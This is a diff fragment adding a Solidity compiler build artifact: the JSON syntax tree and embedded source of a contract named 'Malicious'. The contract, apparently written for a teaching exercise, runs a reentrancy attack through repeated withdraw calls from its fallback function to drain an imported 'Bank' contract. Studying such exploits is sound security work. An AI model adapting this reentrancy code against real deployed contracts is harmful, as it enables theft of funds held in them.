+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "isStructConstructorCall": false,
+                                                                    "lValueRequested": false,
+                                                                    "names": [
+                                                                        null
+                                                                    ],
+                                                                    "type": "function () payable external returns (uint256)",
+                                                                    "type_conversion": false
+                                                                },
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": [
+                                                                                {
+                                                                                    "typeIdentifier": "t_uint256",
+                                                                                    "typeString": "uint256"
+                                                                                }
+                                                                            ],
+                                                                            "isConstant": false,
+                                                                            "isLValue": false,
+                                                                            "isPure": false,
+                                                                            "lValueRequested": false,
+                                                                            "member_name": "value",
+                                                                            "referencedDeclaration": null,
+                                                                            "type": "function (uint256) pure returns (function () payable external returns (uint256))"
+                                                                        },
+                                                                        "children": [
+                                                                            {
+                                                                                "attributes": {
+                                                                                    "argumentTypes": null,
+                                                                                    "isConstant": false,
+                                                                                    "isLValue": false,
+                                                                                    "isPure": false,
+                                                                                    "lValueRequested": false,
+                                                                                    "member_name": "deposit",
+                                                                                    "referencedDeclaration": 11,
+                                                                                    "type": "function () payable external returns (uint256)"
+                                                                                },
+                                                                                "children": [
+                                                                                    {
+                                                                                        "attributes": {
+                                                                                            "argumentTypes": null,
+                                                                                            "overloadedDeclarations": [
+                                                                                                null
+                                                                                            ],
+                                                                                            "referencedDeclaration": 29,
+                                                                                            "type": "contract Bank",
+                                                                                            "value": "targetBank"
+                                                                                        },
+                                                                                        "id": 62,
+                                                                                        "name": "Identifier",
+                                                                                        "src": "338:10:1"
+                                                                                    }
+                                                                                ],
+                                                                                "id": 65,
+                                                                                "name": "MemberAccess",
+                                                                                "src": "338:18:1"
+                                                                            }
+                                                                        ],
+                                                                        "id": 66,
+                                                                        "name": "MemberAccess",
+                                                                        "src": "338:24:1"
+                                                                    },
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "isConstant": false,
+                                                                            "isLValue": false,
+                                                                            "isPure": false,
+                                                                            "lValueRequested": false,
+                                                                            "member_name": "value",
+                                                                            "referencedDeclaration": null,
+                                                                            "type": "uint256"
+                                                                        },
+                                                                        "children": [
+                                                                            {
+                                                                                "attributes": {
+                                                                                    "argumentTypes": null,
+                                                                                    "overloadedDeclarations": [
+                                                                                        null
+                                                                                    ],
+                                                                                    "referencedDeclaration": 116,
+                                                                                    "type": "msg",
+                                                                                    "value": "msg"
+                                                                                },
+                                                                                "id": 67,
+                                                                                "name": "Identifier",
+                                                                                "src": "363:3:1"
+                                                                            }
+                                                                        ],
+                                                                        "id": 68,
+                                                                        "name": "MemberAccess",
+                                                                        "src": "363:9:1"
+                                                                    }
+                                                                ],
+                                                                "id": 69,
+                                                                "name": "FunctionCall",
+                                                                "src": "338:35:1"
+                                                            }
+                                                        ],
+                                                        "id": 70,
+                                                        "name": "FunctionCall",
+                                                        "src": "338:37:1"
+                                                    }
+                                                ],
+                                                "id": 71,
+                                                "name": "ExpressionStatement",
+                                                "src": "338:37:1"
+                                            },
+                                            {
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "argumentTypes": null,
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "isStructConstructorCall": false,
+                                                            "lValueRequested": false,
+                                                            "names": [
+                                                                null
+                                                            ],
+                                                            "type": "uint256",
+                                                            "type_conversion": false
+                                                        },
+                                                        "children": [
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": [
+                                                                        {
+                                                                            "typeIdentifier": "t_uint256",
+                                                                            "typeString": "uint256"
+                                                                        }
+                                                                    ],
+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "lValueRequested": false,
+                                                                    "member_name": "withdraw",
+                                                                    "referencedDeclaration": 18,
+                                                                    "type": "function (uint256) external returns (uint256)"
+                                                                },
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "overloadedDeclarations": [
+                                                                                null
+                                                                            ],
+                                                                            "referencedDeclaration": 29,
+                                                                            "type": "contract Bank",
+                                                                            "value": "targetBank"
+                                                                        },
+                                                                        "id": 72,
+                                                                        "name": "Identifier",
+                                                                        "src": "381:10:1"
+                                                                    }
+                                                                ],
+                                                                "id": 74,
+                                                                "name": "MemberAccess",
+                                                                "src": "381:19:1"
+                                                            },
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": null,
+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "lValueRequested": false,
+                                                                    "member_name": "value",
+                                                                    "referencedDeclaration": null,
+                                                                    "type": "uint256"
+                                                                },
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "overloadedDeclarations": [
+                                                                                null
+                                                                            ],
+                                                                            "referencedDeclaration": 116,
+                                                                            "type": "msg",
+                                                                            "value": "msg"
+                                                                        },
+                                                                        "id": 75,
+                                                                        "name": "Identifier",
+                                                                        "src": "401:3:1"
+                                                                    }
+                                                                ],
+                                                                "id": 76,
+                                                                "name": "MemberAccess",
+                                                                "src": "401:9:1"
+                                                            }
+                                                        ],
+                                                        "id": 77,
+                                                        "name": "FunctionCall",
+                                                        "src": "381:30:1"
+                                                    }
+                                                ],
+                                                "id": 78,
+                                                "name": "ExpressionStatement",
+                                                "src": "381:30:1"
+                                            }
+                                        ],
+                                        "id": 79,
+                                        "name": "Block",
+                                        "src": "307:109:1"
+                                    }
+                                ],
+                                "id": 80,
+                                "name": "FunctionDefinition",
+                                "src": "274:142:1"
+                            },
+                            {
+                                "attributes": {
+                                    "documentation": null,
+                                    "implemented": true,
+                                    "isConstructor": false,
+                                    "kind": "fallback",
+                                    "modifiers": [
+                                        null
+                                    ],
+                                    "name": "",
+                                    "scope": 101,
+                                    "stateMutability": "payable",
+                                    "superFunction": null,
+                                    "visibility": "external"
+                                },
+                                "children": [
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 81,
+                                        "name": "ParameterList",
+                                        "src": "428:2:1"
+                                    },
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 82,
+                                        "name": "ParameterList",
+                                        "src": "448:0:1"
+                                    },
+                                    {
+                                        "children": [
+                                            {
+                                                "attributes": {
+                                                    "falseBody": null
+                                                },
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "argumentTypes": null,
+                                                            "commonType": {
+                                                                "typeIdentifier": "t_uint256",
+                                                                "typeString": "uint256"
+                                                            },
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "lValueRequested": false,
+                                                            "operator": ">=",
+                                                            "type": "bool"
+                                                        },
+                                                        "children": [
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": null,
+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "lValueRequested": false,
+                                                                    "member_name": "balance",
+                                                                    "referencedDeclaration": null,
+                                                                    "type": "uint256"
+                                                                },
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "isConstant": false,
+                                                                            "isLValue": false,
+                                                                            "isPure": false,
+                                                                            "isStructConstructorCall": false,
+                                                                            "lValueRequested": false,
+                                                                            "names": [
+                                                                                null
+                                                                            ],
+                                                                            "type": "address",
+                                                                            "type_conversion": true
+                                                                        },
+                                                                        "children": [
+                                                                            {
+                                                                                "attributes": {
+                                                                                    "argumentTypes": [
+                                                                                        {
+                                                                                            "typeIdentifier": "t_contract$_Bank_$24",
+                                                                                            "typeString": "contract Bank"
+                                                                                        }
+                                                                                    ],
+                                                                                    "isConstant": false,
+                                                                                    "isLValue": false,
+                                                                                    "isPure": true,
+                                                                                    "lValueRequested": false,
+                                                                                    "type": "type(address)",
+                                                                                    "value": "address"
+                                                                                },
+                                                                                "id": 83,
+                                                                                "name": "ElementaryTypeNameExpression",
+                                                                                "src": "457:7:1"
+                                                                            },
+                                                                            {
+                                                                                "attributes": {
+                                                                                    "argumentTypes": null,
+                                                                                    "overloadedDeclarations": [
+                                                                                        null
+                                                                                    ],
+                                                                                    "referencedDeclaration": 29,
+                                                                                    "type": "contract Bank",
+                                                                                    "value": "targetBank"
+                                                                                },
+                                                                                "id": 84,
+                                                                                "name": "Identifier",
+                                                                                "src": "465:10:1"
+                                                                            }
+                                                                        ],
+                                                                        "id": 85,
+                                                                        "name": "FunctionCall",
+                                                                        "src": "457:19:1"
+                                                                    }
+                                                                ],
+                                                                "id": 86,
+                                                                "name": "MemberAccess",
+                                                                "src": "457:27:1"
+                                                            },
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": null,
+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "lValueRequested": false,
+                                                                    "member_name": "value",
+                                                                    "referencedDeclaration": null,
+                                                                    "type": "uint256"
+                                                                },
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "overloadedDeclarations": [
+                                                                                null
+                                                                            ],
+                                                                            "referencedDeclaration": 116,
+                                                                            "type": "msg",
+                                                                            "value": "msg"
+                                                                        },
+                                                                        "id": 87,
+                                                                        "name": "Identifier",
+                                                                        "src": "488:3:1"
+                                                                    }
+                                                                ],
+                                                                "id": 88,
+                                                                "name": "MemberAccess",
+                                                                "src": "488:9:1"
+                                                            }
+                                                        ],
+                                                        "id": 89,
+                                                        "name": "BinaryOperation",
+                                                        "src": "457:40:1"
+                                                    },
+                                                    {
+                                                        "children": [
+                                                            {
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "isConstant": false,
+                                                                            "isLValue": false,
+                                                                            "isPure": false,
+                                                                            "isStructConstructorCall": false,
+                                                                            "lValueRequested": false,
+                                                                            "names": [
+                                                                                null
+                                                                            ],
+                                                                            "type": "uint256",
+                                                                            "type_conversion": false
+                                                                        },
+                                                                        "children": [
+                                                                            {
+                                                                                "attributes": {
+                                                                                    "argumentTypes": [
+                                                                                        {
+                                                                                            "typeIdentifier": "t_uint256",
+                                                                                            "typeString": "uint256"
+                                                                                        }
+                                                                                    ],
+                                                                                    "isConstant": false,
+                                                                                    "isLValue": false,
+                                                                                    "isPure": false,
+                                                                                    "lValueRequested": false,
+                                                                                    "member_name": "withdraw",
+                                                                                    "referencedDeclaration": 18,
+                                                                                    "type": "function (uint256) external returns (uint256)"
+                                                                                },
+                                                                                "children": [
+                                                                                    {
+                                                                                        "attributes": {
+                                                                                            "argumentTypes": null,
+                                                                                            "overloadedDeclarations": [
+                                                                                                null
+                                                                                            ],
+                                                                                            "referencedDeclaration": 29,
+                                                                                            "type": "contract Bank",
+                                                                                            "value": "targetBank"
+                                                                                        },
+                                                                                        "id": 90,
+                                                                                        "name": "Identifier",
+                                                                                        "src": "507:10:1"
+                                                                                    }
+                                                                                ],
+                                                                                "id": 92,
+                                                                                "name": "MemberAccess",
+                                                                                "src": "507:19:1"
+                                                                            },
+                                                                            {
+                                                                                "attributes": {
+                                                                                    "argumentTypes": null,
+                                                                                    "isConstant": false,
+                                                                                    "isLValue": false,
+                                                                                    "isPure": false,
+                                                                                    "lValueRequested": false,
+                                                                                    "member_name": "value",
+                                                                                    "referencedDeclaration": null,
+                                                                                    "type": "uint256"
+                                                                                },
+                                                                                "children": [
+                                                                                    {
+                                                                                        "attributes": {
+                                                                                            "argumentTypes": null,
+                                                                                            "overloadedDeclarations": [
+                                                                                                null
+                                                                                            ],
+                                                                                            "referencedDeclaration": 116,
+                                                                                            "type": "msg",
+                                                                                            "value": "msg"
+                                                                                        },
+                                                                                        "id": 93,
+                                                                                        "name": "Identifier",
+                                                                                        "src": "527:3:1"
+                                                                                    }
+                                                                                ],
+                                                                                "id": 94,
+                                                                                "name": "MemberAccess",
+                                                                                "src": "527:9:1"
+                                                                            }
+                                                                        ],
+                                                                        "id": 95,
+                                                                        "name": "FunctionCall",
+                                                                        "src": "507:30:1"
+                                                                    }
+                                                                ],
+                                                                "id": 96,
+                                                                "name": "ExpressionStatement",
+                                                                "src": "507:30:1"
+                                                            }
+                                                        ],
+                                                        "id": 97,
+                                                        "name": "Block",
+                                                        "src": "499:45:1"
+                                                    }
+                                                ],
+                                                "id": 98,
+                                                "name": "IfStatement",
+                                                "src": "454:90:1"
+                                            }
+                                        ],
+                                        "id": 99,
+                                        "name": "Block",
+                                        "src": "448:100:1"
+                                    }
+                                ],
+                                "id": 100,
+                                "name": "FunctionDefinition",
+                                "src": "420:128:1"
+                            }
+                        ],
+                        "id": 101,
+                        "name": "ContractDefinition",
+                        "src": "47:503:1"
+                    }
+                ],
+                "id": 102,
+                "name": "SourceUnit",
+                "src": "0:551:1"
+            },
+            "id": 1,
+            "source": "pragma solidity ^0.5.0;\n\nimport './Bank.sol';\n\ncontract Malicious {\n  Bank public targetBank;\n\n  event LogTest(uint value);\n\n  constructor(address _targetBank) public {\n    targetBank = Bank(_targetBank);\n  }\n\n  function kill() public {\n    selfdestruct(msg.sender);\n  }\n\n  function attack() public payable {\n    targetBank.enroll();\n    targetBank.deposit.value(msg.value)();\n    targetBank.withdraw(msg.value);\n  }\n\n  function() external payable {\n    if(address(targetBank).balance >= msg.value) {\n      targetBank.withdraw(msg.value);\n    }\n  }\n}\n"
+        }
+    }
+}
